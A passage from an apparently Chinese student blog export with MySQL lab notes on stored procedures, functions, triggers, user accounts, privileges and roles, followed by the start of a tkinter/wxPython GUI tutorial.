class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显示索引信息</p><p>你可以使用 SHOW INDEX 命令来列出表中的相关的索引信息。可以通过添加 \G 来格式化输出信息。</p><h3 id="实验十四：存储过程及函数的使用实验"><a href="#实验十四：存储过程及函数的使用实验" class="headerlink" title="实验十四：存储过程及函数的使用实验"></a>实验十四：存储过程及函数的使用实验</h3><p><strong>一、实验目的</strong></p><ol><li>存储过程及函数的使用实验</li></ol><p><strong>二、实验要求</strong></p><ol><li><p>了解MySQL数据库存储过程及函数的异同</p></li><li><p>使用存储过程实现相关操作</p></li></ol><p><strong>三、实验过程</strong></p><p>知识导入：</p><p>存储过程，函数和触发器之间的区别：</p><ol><li><p>存储过程实现的功能要复杂一些，而函数实现的功能针对性比较强。</p></li><li><p>存储过程一般是作为一个独立的部分来执行，而函数可以作为查询语句的一个部分来调用；</p></li><li><p>触发器是特殊的存储过程，存储过程需要程序调用，而触发器会自动执行。</p></li></ol><p>三者的特点：</p><ol><li><p>存储过程的特点</p><ul><li>存储过程只在创建时进行编译，以后执行存储过程都不需要再重新编译，而一般SQL语句每执行一次就编译一次，所以使用存储过程可以提高数据库执行速度。</li><li>当对数据库进行复杂操作时（如对多个表进行Update、Insert、Query、Delete），可将此复杂操作用存储过程封装起来。</li><li>可以在过程中调用另一个存储过程。可以再存储过程中调用函数，可以简化一系列复杂语句。</li><li>安全性高，可设定只有某用户才具有对指定存储过程的使用权。</li><li>参数有三种（In、Out、In Out），可返回多个参数值。</li><li>在Oracle中，若干个有联系的过程可以组合在一起构成程序包。</li><li>存储过程是数据库中的一个重要对象，任何一个设计良好的数据库应用程序都应该用到存储过程。</li></ul></li><li><p>函数的特点</p><ul><li>函数只有一种参数（In）,只有一条Return语句，只能返回单一值。</li><li>可在SQL语句（DML或Select）中调用函数。由于函数可以返回一个表象，因此它可以在查询语句中位于From关键字的后面。</li></ul></li><li><p>触发器的特点</p><ul><li>触发器是特殊的存储过程，存储过程需要程序调用，而触发器会自动执行</li></ul></li></ol><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">USE school ;DELIMITER $$CREATE PROCEDURE insert_student (  p_sno CHAR(10),  p_sname VARCHAR (50),  p_sex VARCHAR (1),  p_age INT,  p_dept VARCHAR (20)  -- 在存储过程中定义的变量跟表中数据没有直接联系  -- 在数据定义时声明长度可以大于原数据库的数据长度，不会报错，但是在数据输入时弱数据大于数据库要求会造成截断。) BEGIN  # 声明变量info，以表明插入是否成功。  DECLARE info VARCHAR (20) DEFAULT &#39;插入成功&#39; ;  # 异常处理  DECLARE CONTINUE HANDLER FOR 1062 SET info &#x3D; &#39;插入失败，不能插入重复的数据&#39; ;  INSERT INTO student   VALUES    (p_sno, p_sname, p_sex, p_age, p_dept) ;  SELECT     info ;END $$DELIMITER ;SET @sno &#x3D; &#39;202006020&#39; ;SET @sname &#x3D; &#39;魏延&#39; ;SET @ssex &#x3D; &#39;男&#39; ;SET @sage &#x3D; 25 ;SET @sdept &#x3D; &#39;计算机系&#39; ;CALL insert_student (@sno, @sname, @ssex, @sage, @sdept) ;SELECT * FROM student ;-- select @@version 查询版本 系统变量 -- 查询存储过程 触发器 函数 游标的区别与联系DELIMITER $$CREATE PROCEDURE search_sc(p_sno CHAR(10),p_cno CHAR(10),OUT p_grade INT)BEGINDECLARE info VARCHAR(30) DEFAULT &#39;查找成功&#39;;DECLARE  CONTINUE  HANDLER  FOR  NOT  FOUND  SET  info&#x3D;&#39;查找失败&#39;;SELECT  grade  INTO  p_grade  FROM  sc  WHERE  sno&#x3D;p_sno AND cno&#x3D;p_cno;    SELECT info;END $$DELIMITER ;SET @vsno&#x3D;&#39;202006001&#39;;SET @vcno&#x3D;&#39;C001&#39;;CALL search_sc(@vsno,@vcno,@p_grade);SELECT @p_grade;# 函数：SHOW VARIABLES LIKE &#39;%func%&#39;;SET GLOBAL log_bin_trust_function_creators &#x3D; 1;-- 第一次使用MySQL的函数功能发生报错1418解决方法如下-- 1.先查看函数功能是否开启：show variables like &#39;%func%&#39;;-- 2.开启：SET GLOBAL log_bin_trust_function_creators &#x3D; 1;-- 3.关闭：SET GLOBAL log_bin_trust_function_creators &#x3D; 0;USE school;DELIMITER $$  DROP FUNCTION IF EXISTS &#96;get_avgscore&#96;;-- 在MySQL中在已有定于函数之后，我们无法直接在进行操作，我们需要把原有函数删除。CREATE  FUNCTION  get_avgscore(f_sno CHAR(10))RETURNS  FLOATBEGIN      RETURN (SELECT  ROUND(AVG(grade), 2)                         FROM  SC  WHERE  sno&#x3D;f_sno); END $$DELIMITER ; SELECT get_avgscore(&#39;202006001&#39;);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="实验十五：触发器与游标的学习与使用"><a href="#实验十五：触发器与游标的学习与使用" class="headerlink" title="实验十五：触发器与游标的学习与使用"></a>实验十五：触发器与游标的学习与使用</h3><p><strong>一、实验目的</strong></p><ol><li><p>学习触发器和游标的使用</p></li><li><p>掌握MySQL数据库对用户与权限的相关操作的原理及方法</p></li></ol><p><strong>二 、实验要求</strong></p><ol><li><p>了解MySQL数据库存储过程及函数的异同</p></li><li><p>使用存储过程实现相关操作</p></li><li><p>练习了解MySQL数据库用户权限设置</p></li></ol><p><strong>三、实验过程</strong></p><p>知识导入：</p><p>触发器是特殊的存储过程，存储过程需要程序调用，而触发器会自动执行。</p><p>代码内容：</p><p>触发器与游标相关：</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">delimiter $$create function get_avgscore(f_sno int)returns floatbeginreturn(select round(avg(score),2)from scwhere sno &#x3D; f_sno);end $$delimiter ;use school;delimiter $$create trigger trg_student_delete2before delete on studentfor each rowbegin  delete from sc where sno &#x3D; old.sno;end $$delimiter ;show triggers from school;select * from student;delete from studentwhere sno &#x3D; &#39;202006002&#39;;select * from sc;select * from student;delimiter $$create function get_avgscore(f_sno char(2))returns floatbeginreturn(select round(avg(score),2)          from sc where sno&#x3D;f_sno);          -- return后面括号内部的语句最后一条不加分号，类似于select后面的元素，return后面整体的加分号end $$delimiter ;delimiter $$create function get_avgscore(f_sno char(3))returns floatbeginreturn(select round(avg(score),2)from sc where sno&#x3D;f_sno      );end $$delimiter ;drop function if exists get_avgscore; -- 删除时函数名后面不加括号drop function if exists get_avgscore;drop function if exists get_avgscore;drop procedure if exists get_avgscore;drop procedure if exists get_avgscore;delimiter $$create procedure sum()begin  declare sums3 int;  declare sums5 int;  if(sums3 &gt; sums5) then    select &#39;s3的总成绩大于s5的总成绩&#39;;elseif(sums3 &lt; sums5) thenselect &#39;s3的总成绩小于s5的总成绩&#39;;else       select &#39;s3的总成绩等于s5的总成绩&#39;;end $$delimiter ;use school;create table if not exists &#96;store&#96; (    &#39;id&#39; int(11) not null auto_increment,    &#39;name&#39; varchar(20) not null,    &#39;count&#39; int(11) not null default &#39;1&#39;,  primary key (&#39;id&#39;)) engine&#x3D;innodb default charset&#x3D;latin1 auto_increment&#x3D;7;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>二、用户操作</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql"># 1.查看所有用户信息。SELECT USER,HOST FROM mysql.user;# 2.创建用户user1,user3，user4密码自定，主机形式分别为localhost、%和你的主机IP地址，并再次查看用户是否创建成功。。 CREATE USER &#39;user1&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;1&#39;; CREATE USER &#39;user3&#39;@&#39;%&#39; IDENTIFIED BY &#39;3&#39;; CREATE USER &#39;user4&#39;@&#39;192.168.82.41&#39; IDENTIFIED BY &#39;4&#39;; SELECT USER,HOST FROM mysql.user;# 3.修改用户user4的名字为user5，并修改其密码（自定），其他不变。RENAME USER &#39;user4&#39;@&#39;192.168.82.41&#39; TO &#39;user5&#39;@&#39;192.168.82.41&#39;;ALTER USER &#39;user5&#39;@&#39;192.168.82.41&#39; IDENTIFIED WITH mysql_native_password BY &#39;5&#39;;RENAME USER &#39;user5&#39;@&#39;localhost&#39; TO &#39;user5&#39;@&#39;192.168.82.41&#39;;  -- 主机名也可以修改，但本题没要求SELECT USER,HOST FROM mysql.user;# 4.删除用户user5。DROP USER user5@192.168.82.41;SELECT USER,HOST FROM mysql.user;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>– 二、权限操作</p><ol><li>在root用户的连接下，授予user1创建数据库，创建用户的权限，创建完成后查看用户user1的权限。</li></ol><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT HOST,USER,create_priv,create_user_priv ,grant_priv FROM mysql.user;GRANT CREATE ON *.* TO user1@localhost;GRANT CREATE USER ON *.* TO user1@localhost;SELECT HOST,USER,create_priv,create_user_priv,grant_priv FROM mysql.user; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="2"><li><p>建立user1与MySQL数据库的连接。 </p></li><li><p>在user1的连接下创建用户user2（其他自定），创建数据库db1,并查看是否创建成功。</p></li></ol><p>在db1数据库中创建t1和t2表，结构和内容自定。测试能否向表t1中插入数据和查询数据，为什么？</p><p> – 以下代码在user1的连接下书写并执行：</p> <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">CREATE DATABASE db1;  CREATE TABLE t1  ( tid SMALLINT PRIMARY KEY,   tname VARCHAR(10));  CREATE TABLE t2  ( tid2 SMALLINT PRIMARY KEY,   tname2 VARCHAR(10));  INSERT INTO t1 VALUES(1,&#39;Tom&#39;);  -- 没有该权限  SELECT * FROM t1;  -- 没有该权限  CREATE USER &#39;user2&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;2&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>   – 以下代码在root的连接下书写并执行，去验证是否有user2用户。</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT USER,HOST FROM mysql.user;  -- 查看是否有user2用户 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="4"><li>在root用户的连接下，授予user1对表t1和t2的查询与插入数据的权限，并允许user1传播对t1表和t2表的查询权限。</li></ol><p>查看user1的相关权限</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT HOST,USER,select_priv,insert_priv FROM mysql.db;GRANT INSERT ON db1.* TO user1@localhost;GRANT SELECT ON db1.* TO user1@localhost WITH GRANT OPTION;SELECT HOST,USER,select_priv,insert_priv FROM mysql.db;  -- 查看是否授权成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ol start="5"><li>在user1的连接下.测试其是否能查询t1和t2表的内容。</li></ol><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM t1;SELECT * FROM t2; <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="6"><li>在root用户的连接下，授予user1可以授权的权限（grant）</li></ol><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">GRANT GRANT OPTION ON db1.* TO user1@localhost;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="7"><li>在user1的连接下，将查询t1表的权限授予user2。</li></ol><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">GRANT SELECT ON db1.t1 TO user2@localhost;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="8"><li>在root用户的连接下，查看user2的权限。</li></ol><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM mysql.tables_priv;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="9"><li>建立user2与MySQL数据库的连接.并测试其是否能查询t1表和t2表的内容，对查询结果进行解释。</li></ol><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM t1;SELECT * FROM t2;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>回收权限</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">#1在root的连接下，回收user1查询db1数据库中所有表的权限授，回收完成后再次查看user1的权限。REVOKE SELECT ON db1.* FROM user1@localhost;SELECT HOST,USER,select_priv,insert_priv FROM mysql.db;#2在user1的连接下，测试其是否还能查询t1和t2表的内容。SELECT * FROM t1;SELECT * FROM t2;#3在user2的连接下，测试其是否还能查询t1表的内容。这说明什么问题？SELECT * FROM t1;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>三、角色管理</p><ol><li>在root的连接下，创建角色 role1，主机自定，并在mysql.user中查看创建的角色。</li></ol><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">CREATE ROLE role1;SELECT USER,HOST FROM mysql.user;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="2"><li>在root的连接下，给角色 role1授予更新t1表的权限，并查看角色的权限。</li></ol><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">GRANT UPDATE ON db1.t1 TO role1;SELECT * FROM mysql.tables_priv;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="3"><li>在root的连接下，将角色role1授予用户user2。</li></ol> <pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">GRANT role1 TO user2@localhost;SELECT * FROM mysql.tables_priv; -- user2还没有这个权限<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="4"><li>在user2的连接下，查看自己拥有的角色。</li></ol><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT CURRENT_ROLE(); -- 结果为空<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="5"><li>在user2的连接下，启用user2上的role1角色，再次查看user2拥有的角色。</li></ol><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SET ROLE role1;SELECT CURRENT_ROLE(); -- 结果有了role1角色<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ol start="6"><li>在user2的连接下，修改t1表。</li></ol><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">SELECT * FROM t1;UPDATE t1 SET tname&#x3D;&#39;Marry&#39; WHERE tid&#x3D;1; -- 修改成功SELECT * FROM t1;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="7"><li>在root连接下，撤销user2的role1角色，并再次修改t1表，测试是否成功，为什么？</li></ol><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">REVOKE role1 FROM user2@localhost;-- 在user2的连接下，测试是否还能修改t1表UPDATE t1 SET tname&#x3D;&#39;Marry2&#39; WHERE tid&#x3D;1; -- 不成功<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ol start="8"><li>在root的连接下，删除角色role1。</li></ol><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">DROP ROLE role1;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python的GUI编程和tkinter，Wxpython</title>
      <link href="/2022/07/05/python%E7%9A%84GUI%E7%BC%96%E7%A8%8B%E5%92%8Ctkinter/"/>
      <url>/2022/07/05/python%E7%9A%84GUI%E7%BC%96%E7%A8%8B%E5%92%8Ctkinter/</url>
      
        <content type="html"><![CDATA[<h1 id="Python的GUI编程和tkinter，Wxpython"><a href="#Python的GUI编程和tkinter，Wxpython" class="headerlink" title="Python的GUI编程和tkinter，Wxpython"></a>Python的GUI编程和tkinter，Wxpython</h1><blockquote><p>PythonGUI这个内容是我在课程论文准备之初临时去学的一些内容，起初我准备学下tkinter做我课程论文项目的前段显示，但是由于临时的一些变动，我最终是采用了Wxpython的方式进行的可视化。当然这两个库在本质上都属于PythonGul。</p></blockquote><p>[TOC]</p><h2 id="PythonGUI介绍："><a href="#PythonGUI介绍：" class="headerlink" title="PythonGUI介绍："></a>PythonGUI介绍：</h2><ul><li><strong>Tkinter：</strong> Tkinter 模块(Tk 接口)是 Python 的标准 Tk GUI 工具包的接口 .Tk 和 Tkinter 可以在大多数的 Unix 平台下使用,同样可以应用在 Windows 和 Macintosh 系统里。Tk8.0 的后续版本可以实现本地窗口风格,并良好地运行在绝大多数平台中。</li><li><strong>wxPython：</strong>wxPython 是一款开源软件，是 Python 语言的一套优秀的 GUI 图形库，允许 Python 程序员很方便的创建完整的、功能健全的 GUI 用户界面。</li><li><strong>Jython：</strong>Jython 程序可以和 Java 无缝集成。除了一些标准模块，Jython 使用 Java 的模块。Jython 几乎拥有标准的Python 中不依赖于 C 语言的全部模块。比如，Jython 的用户界面将使用 Swing，AWT或者 SWT。Jython 可以被动态或静态地编译成 Java 字节码。</li></ul><h2 id="tkinter"><a href="#tkinter" class="headerlink" title="tkinter"></a>tkinter</h2><h3 id="根窗体root："><a href="#根窗体root：" class="headerlink" title="根窗体root："></a>根窗体root：</h3><p>根窗体是图像化应用程序的根控制器，是tkinter的底层控件的实例。当导入tkinter模块后，调用 Tk()方法可初始化一个根窗体实例 root ,用 title() 方法可设置其标题文字，用geometry()方法可以设置窗体的大小（以像素为单位）。将其置于主循环中，除非用户关闭，否则程序始终处于运行状态。执行该程序，一个窗体就呈现出来了。在这个主循环的根窗体中，可持续呈现中的其他可视化控件实例，监测事件的发生并执行相应的处理程序 </p><p>主窗口位置和大小通过，geometry(‘wxh ± y ± z’)方法进行设置，w为宽度，h为高度，x用于分隔高度和宽度，+x表示距离屏幕左边的距离，-x表示距离屏幕右边的距离，±y同理。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#代码实现：</span><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span>root<span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'我的第一个Python窗体'</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>geometry<span class="token punctuation">(</span><span class="token string">'240x240'</span><span class="token punctuation">)</span> <span class="token comment"># 这里的乘号不是 * ，而是小写英文字母 x</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="GUI组件表："><a href="#GUI组件表：" class="headerlink" title="GUI组件表："></a>GUI组件表：</h3><p>Tkinter的提供各种控件，如按钮，标签和文本框，一个GUI应用程序中使用。这些控件通常被称为控件或者部件。目前有15种Tkinter的部件。</p><table><thead><tr><th>Button</th><th>按钮控件；在程序中显示按钮。</th></tr></thead><tbody><tr><td>Canvas</td><td>画布控件；显示图形元素如线条或文本</td></tr><tr><td>Checkbutton</td><td>多选框控件；用于在程序中提供多项选择框</td></tr><tr><td>Entry</td><td>输入控件；用于显示简单的文本内容</td></tr><tr><td>Frame</td><td>框架控件；在屏幕上显示一个矩形区域，多用来作为容器</td></tr><tr><td>Label</td><td>标签控件；可以显示文本和位图</td></tr><tr><td>Listbox</td><td>列表框控件；在Listbox窗口小部件是用来显示一个字符串列表给用户</td></tr><tr><td>Menubutton</td><td>菜单按钮控件，用于显示菜单项。</td></tr><tr><td>Menu</td><td>菜单控件；显示菜单栏,下拉菜单和弹出菜单</td></tr><tr><td>Message</td><td>消息控件；用来显示多行文本，与label比较类似</td></tr><tr><td>Radiobutton</td><td>单选按钮控件；显示一个单选的按钮状态</td></tr><tr><td>Scale</td><td>范围控件；显示一个数值刻度，为输出限定范围的数字区间</td></tr><tr><td>Scrollbar</td><td>滚动条控件，当内容超过可视化区域时使用，如列表框。.</td></tr><tr><td>Text</td><td>文本控件；用于显示多行文本</td></tr><tr><td>Toplevel</td><td>容器控件；用来提供一个单独的对话框，和Frame比较类似</td></tr><tr><td>Spinbox</td><td>输入控件；与Entry类似，但是可以指定输入范围值</td></tr><tr><td>PanedWindow</td><td>PanedWindow是一个窗口布局管理的插件，可以包含一个或者多个子控件。</td></tr><tr><td>LabelFrame</td><td>labelframe 是一个简单的容器控件。常用与复杂的窗口布局。</td></tr><tr><td>messagebox</td><td>用于显示你应用程序的消息框。</td></tr></tbody></table><h4 id="Python-Tkinter-通用控件属性："><a href="#Python-Tkinter-通用控件属性：" class="headerlink" title="Python Tkinter 通用控件属性："></a>Python Tkinter 通用控件属性：</h4><img src="C:\Users\888888\AppData\Roaming\Typora\typora-user-images\1657019136331.png"  /><h4 id="Python-Tkinter-按钮组件-Button"><a href="#Python-Tkinter-按钮组件-Button" class="headerlink" title="Python Tkinter 按钮组件 (Button)"></a>Python Tkinter 按钮组件 (Button)</h4><p>按钮组件用于在 Python 应用程序中添加按钮，按钮上可以放上文本或图像，按钮可用于监听用户行为，能够与一个 Python 函数关联，当按钮被按下时，自动调用该函数。 </p><pre class="line-numbers language-python" data-language="python"><code class="language-python">w <span class="token operator">=</span> Button <span class="token punctuation">(</span> master<span class="token punctuation">,</span> option<span class="token operator">=</span>value<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">)</span><span class="token comment"># master 组件的父容器</span><span class="token comment"># option 可选项，这个包括很多内容这些选项可以用键 = 值的形式设置，并以逗号分隔</span><span class="token comment"># 包括command（按钮的关联函数），font（文本字体），height（按钮的高度），image（按钮的背景图片），width，text（文本），underline（下划线）等内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> Button按钮的状态有：<code>normal</code>  ,  <code>active</code>  ,  <code>disabled</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> tkinter<span class="token keyword">import</span> tkinter<span class="token punctuation">.</span>messagebox top <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Tk<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">helloCallBack</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    tkinter<span class="token punctuation">.</span>messagebox<span class="token punctuation">.</span>showinfo<span class="token punctuation">(</span><span class="token string">"Hello Python"</span><span class="token punctuation">,</span> <span class="token string">"Hello Runoob"</span><span class="token punctuation">)</span>B <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Button<span class="token punctuation">(</span>top<span class="token punctuation">,</span> text<span class="token operator">=</span><span class="token string">"点我"</span><span class="token punctuation">,</span> command<span class="token operator">=</span>helloCallBack<span class="token punctuation">)</span>B<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>top<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里稍微做一点说明，这个实例来自于菜鸟教程，而在菜鸟教程上的写法是 import tkMessageBox ,还是有很多区别的，在python3以后的版本中，tkinter应该首字母小写，而tkMessageBox及库中对应的函数应该相应改为<strong>tkinter.messagebox</strong></p><p>在具体使用按钮组件进行函数调用时也有对应内容：</p><ul><li><p>直接调用函数。<strong>参数表达式为“command=函数名”，注意函数名后面不要加括号，也不能传递参数</strong>。如下面的command=run1：</p></li><li><p>利用匿名函数调用函数和传递参数。参数的表达式为“command=lambda”:函数名（参数列表）</p></li></ul><h5 id="Python-Tkinter-单选按钮控件-Radiobutton"><a href="#Python-Tkinter-单选按钮控件-Radiobutton" class="headerlink" title="Python Tkinter 单选按钮控件(Radiobutton)"></a>Python Tkinter 单选按钮控件(Radiobutton)</h5><p>是为了响应故乡排斥的若干单选项的单击事件以触发运行自定义函数所设的，该控件排除具有共有属性外，还具有显示文本（text）、返回变量（variable）、返回值（value）、响应函数名（command）等重要属性。响应函数名“command=函数名”的用法与Button相同，函数名最后也要加括号。返回变量variable=var通常应预先声明变量的类型var=IntVar()或var=StringVar(),在所调用的函数中方可用var.get()方法获取被选中实例的value值。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> tkinter <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">def</span> <span class="token function">Mysel</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      dic <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token string">'甲'</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string">'乙'</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token string">'丙'</span><span class="token punctuation">&#125;</span>      s <span class="token operator">=</span> <span class="token string">"您选了"</span> <span class="token operator">+</span> dic<span class="token punctuation">.</span>get<span class="token punctuation">(</span>var<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"项"</span>      lb<span class="token punctuation">.</span>config<span class="token punctuation">(</span>text <span class="token operator">=</span> s<span class="token punctuation">)</span>root <span class="token operator">=</span> Tk<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'单选按钮'</span><span class="token punctuation">)</span>lb <span class="token operator">=</span> Label<span class="token punctuation">(</span>root<span class="token punctuation">)</span>lb<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>var <span class="token operator">=</span> IntVar<span class="token punctuation">(</span><span class="token punctuation">)</span>rd1 <span class="token operator">=</span> Radiobutton<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"甲"</span><span class="token punctuation">,</span>variable<span class="token operator">=</span>var<span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>command<span class="token operator">=</span>Mysel<span class="token punctuation">)</span>rd1<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>rd2 <span class="token operator">=</span> Radiobutton<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"乙"</span><span class="token punctuation">,</span>variable<span class="token operator">=</span>var<span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>command<span class="token operator">=</span>Mysel<span class="token punctuation">)</span>rd2<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>rd3 <span class="token operator">=</span> Radiobutton<span class="token punctuation">(</span>root<span class="token punctuation">,</span>text<span class="token operator">=</span><span class="token string">"丙"</span><span class="token punctuation">,</span>variable<span class="token operator">=</span>var<span class="token punctuation">,</span>value<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">,</span>command<span class="token operator">=</span>Mysel<span class="token punctuation">)</span>rd3<span class="token punctuation">.</span>pack<span class="token punctuation">(</span><span class="token punctuation">)</span>root<span class="token punctuation">.</span>mainloop<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="Python-Tkinter-复选框（Checkbutton）"><a href="#Python-Tkinter-复选框（Checkbutton）" class="headerlink" title="Python Tkinter 复选框（Checkbutton）"></a>Python Tkinter 复选框（Checkbutton）</h5><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 定义方法</span>w <span class="token operator">=</span> tkinter<span class="token punctuation">.</span>Checkbutton<span class="token punctuation">(</span> master<span class="token punctuation">,</span> option<span class="token operator">=</span>value<span class="token punctuation">,</span> <span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> <span class="token punctuation">)</span><span class="token comment"># 在python3中，复选框的定义方式发生了略微改变</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>复选框</strong>：(Checkbutton) 是为了返回多个选项值的交互控件，通常不直接触发函数的执行。该控件除具有共有属性外，还具有显示文本（text）、返回变量（variable）、选中返回值（onvalue）和未选中默认返回值（offvalue）等重要属性。返回变量variable=var 通常可以预先逐项分别声明变量的类型var=IntVar() (默认)或 